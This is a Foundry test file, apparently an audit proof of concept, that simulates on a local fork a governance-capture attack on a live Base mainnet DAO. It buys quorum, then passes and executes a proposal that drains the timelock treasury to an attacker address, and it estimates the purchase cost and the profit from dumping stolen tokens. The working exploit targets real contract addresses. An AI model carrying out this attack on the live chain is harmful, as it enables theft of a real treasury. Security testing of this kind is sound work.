// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/* ------------------------------------------------------------------ */
/*  Minimal interfaces                                                 */
/* ------------------------------------------------------------------ */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function delegate(address) external;
    function getPastVotes(address, uint256) external view returns (uint256);
    function getPastTotalSupply(uint256) external view returns (uint256);
}

interface IGovernor {
    function propose(address[] memory, uint256[] memory, bytes[] memory, string memory)
        external returns (uint256);
    function castVote(uint256, uint8) external returns (uint256);
    function queue(address[] memory, uint256[] memory, bytes[] memory, bytes32)
        external returns (uint256);
    function execute(address[] memory, uint256[] memory, bytes[] memory, bytes32)
        external payable returns (uint256);
    function state(uint256) external view returns (uint8);
    function votingDelay() external view returns (uint256);
    function votingPeriod() external view returns (uint256);
    function quorum(uint256) external view returns (uint256);
    function proposalThreshold() external view returns (uint256);
    function timelock() external view returns (address);
}

interface ITimelock {
    function getMinDelay() external view returns (uint256);
}

interface IUniV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function fee() external view returns (uint24);
    function liquidity() external view returns (uint128);
}

interface IUniV3SwapCallback {
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data)
        external;
}

/* ------------------------------------------------------------------ */
/*  Fork-only PoC                                                      */
/* ------------------------------------------------------------------ */

contract InternetTokenGovTest is Test, IUniV3SwapCallback {
    // Base mainnet addresses (all read-only; fork only)
    address constant GOVERNOR = 0xc5C3a1882Eff9539527D88E2453cAB10d9bc1581;
    address constant TIMELOCK = 0xE05dD5B785f578337B2B8F695Fbc521669c69403;
    address constant INT = 0x968D6A288d7B024D5012c0B25d67A889E4E3eC19;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant WETH = 0x4200000000000000000000000000000000000006;
    // deepest live INT/WETH 1% pool (UniV3-fork factory 0x0Fd83557..)
    address constant POOL_INT_WETH = 0xDEc6EadbD8eD3F655CBA4Bb4eeFF6fB43B16969d;

    uint160 constant MIN_SQRT_RATIO = 4295128739;
    uint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;

    uint256 constant WETH_USD = 2353.68e18; // stated price, 2026-10-25

    address attacker;

    function setUp() public {
        string memory url = vm.envOr("BASE_RPC_URL", string(""));
        if (bytes(url).length == 0) url = "https://base-rpc.publicnode.com"; // CI secret may be unset/empty
        vm.createSelectFork(url);
        attacker = makeAddr("freshAttacker");
    }

    /* ---------------- Uniswap V3 swap callback ---------------- */
    function uniswapV3SwapCallback(int256 a0, int256 a1, bytes calldata) external {
        if (a0 > 0) IERC20(WETH).transfer(msg.sender, uint256(a0));
        if (a1 > 0) IERC20(INT).transfer(msg.sender, uint256(a1));
    }

    /* ================================================================== */
    /*  TEST A — mechanism: capture quorum, drain timelock via governance  */
    /* ================================================================== */
    function test_A_mechanism_timelock_capture() public {
        uint256 q = IGovernor(GOVERNOR).quorum(block.timestamp - 1);
        emit log_named_uint("A: quorum(INT wei)", q);

        // Fresh attacker buys/holds quorum + 10% margin, then self-delegates.
        uint256 atkTokens = q + q / 10;
        deal(INT, attacker, atkTokens);
        assertEq(IERC20(INT).balanceOf(attacker), atkTokens, "deal INT");

        vm.prank(attacker);
        IERC20(INT).delegate(attacker);

        // Propose: move the whole timelock treasury (INT + USDC + WETH) to attacker.
        uint256 intBal = IERC20(INT).balanceOf(TIMELOCK);
        uint256 usdcBal = IERC20(USDC).balanceOf(TIMELOCK);
        uint256 wethBal = IERC20(WETH).balanceOf(TIMELOCK);
        emit log_named_uint("A: timelock INT", intBal);
        emit log_named_uint("A: timelock USDC", usdcBal);
        emit log_named_uint("A: timelock WETH", wethBal);

        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory calldatas = new bytes[](3);
        targets[0] = INT;
        targets[1] = USDC;
        targets[2] = WETH;
        calldatas[0] = abi.encodeWithSelector(IERC20.transfer.selector, attacker, intBal);
        calldatas[1] = abi.encodeWithSelector(IERC20.transfer.selector, attacker, usdcBal);
        calldatas[2] = abi.encodeWithSelector(IERC20.transfer.selector, attacker, wethBal);

        vm.warp(block.timestamp + 2); // let delegate checkpoint land
        vm.prank(attacker);
        uint256 pid = IGovernor(GOVERNOR).propose(targets, values, calldatas, "P7-LOW-8 fork PoC");

        // vote
        vm.warp(block.timestamp + IGovernor(GOVERNOR).votingDelay() + 1);
        assertEq(IERC20(INT).getPastVotes(attacker, block.timestamp - 1), atkTokens, "votes");
        vm.prank(attacker);
        IGovernor(GOVERNOR).castVote(pid, 1);

        vm.warp(block.timestamp + IGovernor(GOVERNOR).votingPeriod() + 1);
        assertEq(uint256(IGovernor(GOVERNOR).state(pid)), 4, "Succeeded"); // 4 = Succeeded

        // queue + wait timelock delay + execute
        IGovernor(GOVERNOR).queue(targets, values, calldatas, keccak256(bytes("P7-LOW-8 fork PoC")));
        vm.warp(block.timestamp + ITimelock(TIMELOCK).getMinDelay() + 1);
        IGovernor(GOVERNOR).execute(targets, values, calldatas, keccak256(bytes("P7-LOW-8 fork PoC")));

        // attacker now holds the acquired tokens + the stolen treasury
        assertEq(IERC20(INT).balanceOf(attacker), atkTokens + intBal, "INT stolen");
        assertEq(IERC20(USDC).balanceOf(attacker), usdcBal, "USDC stolen");
        assertEq(IERC20(WETH).balanceOf(attacker), wethBal, "WETH stolen");
        emit log_string("A: PASS - timelock fully drained via a passing proposal");
    }

    /* ================================================================== */
    /*  TEST B — acquisition cost: buy quorum INT on the live pool         */
    /* ================================================================== */
    function test_B_acquisition_cost() public {
        uint256 q = IGovernor(GOVERNOR).quorum(block.timestamp - 1);
        emit log_named_uint("B: quorum to buy (INT wei)", q);

        // fund the swapper with WETH (fork only)
        deal(WETH, address(this), 100e18);
        uint256 wBefore = IERC20(WETH).balanceOf(address(this));

        (bool ok, ) = address(this).call(
            abi.encodeWithSelector(this.buyExactOut.selector, POOL_INT_WETH, q)
        );
        uint256 spent;
        if (ok) {
            spent = wBefore - IERC20(WETH).balanceOf(address(this));
            emit log_named_uint("B: WETH spent to buy quorum", spent);
            emit log_named_uint("B: cost USD (e18)", spent * WETH_USD / 1e18);
        } else {
            emit log_string("B: exactOut(quorum) reverted - pool cannot fill");
        }
        assertGt(spent, 0, "must buy quorum");

        // analytic cross-check with in-range liquidity / virtual reserves
        uint256 L = IUniV3Pool(POOL_INT_WETH).liquidity();
        emit log_named_uint("B: in-range liquidity L", L);
    }

    function buyExactOut(address pool, uint256 intOut) external {
        IUniV3Pool(pool).swap(address(this), true, -int256(intOut), MIN_SQRT_RATIO + 1, "");
    }

    /* ================================================================== */
    /*  TEST C — realisable prize: liquid legs + dumping the stolen INT    */
    /* ================================================================== */
    function test_C_realisable_prize() public {
        uint256 q = IGovernor(GOVERNOR).quorum(block.timestamp - 1);
        uint256 intBal = IERC20(INT).balanceOf(TIMELOCK);
        uint256 usdcBal = IERC20(USDC).balanceOf(TIMELOCK);
        uint256 wethBal = IERC20(WETH).balanceOf(TIMELOCK);

        // attacker's post-exploit holdings: acquired quorum + stolen treasury
        uint256 dumpTotal = q + intBal;
        deal(INT, address(this), dumpTotal);
        deal(WETH, address(this), 0);
        emit log_named_uint("C: INT to dump", dumpTotal);

        // chunked sell of INT -> WETH on the live pool
        uint256 chunk = 2_000_000e18;
        uint256 remaining = dumpTotal;
        uint256 wethOut;
        uint256 wBefore = IERC20(WETH).balanceOf(address(this));
        uint256 i;
        while (remaining > 0 && i < 200) {
            uint256 amt = remaining > chunk ? chunk : remaining;
            (bool ok, ) = address(this).call(abi.encodeWithSelector(this.sellExactIn.selector, POOL_INT_WETH, amt));
            if (!ok) break;
            remaining -= amt;
            i++;
        }
        wethOut = IERC20(WETH).balanceOf(address(this)) - wBefore;
        emit log_named_uint("C: chunks sold", i);
        emit log_named_uint("C: WETH out from dumping INT", wethOut);
        emit log_named_uint("C: dump USD (e18)", wethOut * WETH_USD / 1e18);
        emit log_named_uint("C: liquid USDC leg (e6)", usdcBal);
        emit log_named_uint("C: liquid WETH leg", wethBal);

        // gross realisable
        uint256 grossE18 = wethOut + wethBal;
        uint256 grossUsdE18 = grossE18 * WETH_USD / 1e18 + (usdcBal * 1e18) / 1e6;
        emit log_named_uint("C: GROSS realisable USD (e18)", grossUsdE18);
    }

    function sellExactIn(address pool, uint256 intIn) external {
        IUniV3Pool(pool).swap(address(this), false, int256(intIn), MAX_SQRT_RATIO - 1, "");
    }

    /* ================================================================== */
    /*  TEST D — the binding opponent: the live INT delegate with 28.24M   */
    /*  votes means the 25.26M quorum alone LOSES. Measure the cost of a   */
    /*  stake large enough to out-vote it (>28.24M; use 30M for margin).   */
    /* ================================================================== */
    address constant DOMINANT_DELEGATE = 0x0000de0028b400E5EA4F988859852C003600eADE;

    function test_D_outbid_dominant_delegate() public {
        uint256 q = IGovernor(GOVERNOR).quorum(block.timestamp - 1);
        uint256 delegateVotes = IERC20(INT).getPastVotes(DOMINANT_DELEGATE, block.timestamp - 1);
        emit log_named_uint("D: quorum", q);
        emit log_named_uint("D: dominant delegate votes", delegateVotes);
        assertGt(delegateVotes, q, "delegate alone exceeds quorum -> 25.26M stake would LOSE");

        uint256 needed = delegateVotes + 2_000_000e18; // beat it with margin
        emit log_named_uint("D: stake needed to win", needed);

        deal(WETH, address(this), 100e18);
        uint256 wBefore = IERC20(WETH).balanceOf(address(this));
        (bool ok, ) = address(this).call(abi.encodeWithSelector(this.buyExactOut.selector, POOL_INT_WETH, needed));
        uint256 spent;
        if (ok) {
            spent = wBefore - IERC20(WETH).balanceOf(address(this));
            emit log_named_uint("D: WETH spent to buy winning stake", spent);
            emit log_named_uint("D: cost USD (e18)", spent * WETH_USD / 1e18);
        } else {
            emit log_string("D: exactOut(winning stake) reverted - pool cannot fill");
        }
        assertGt(spent, 0, "must buy winning stake");
    }
}
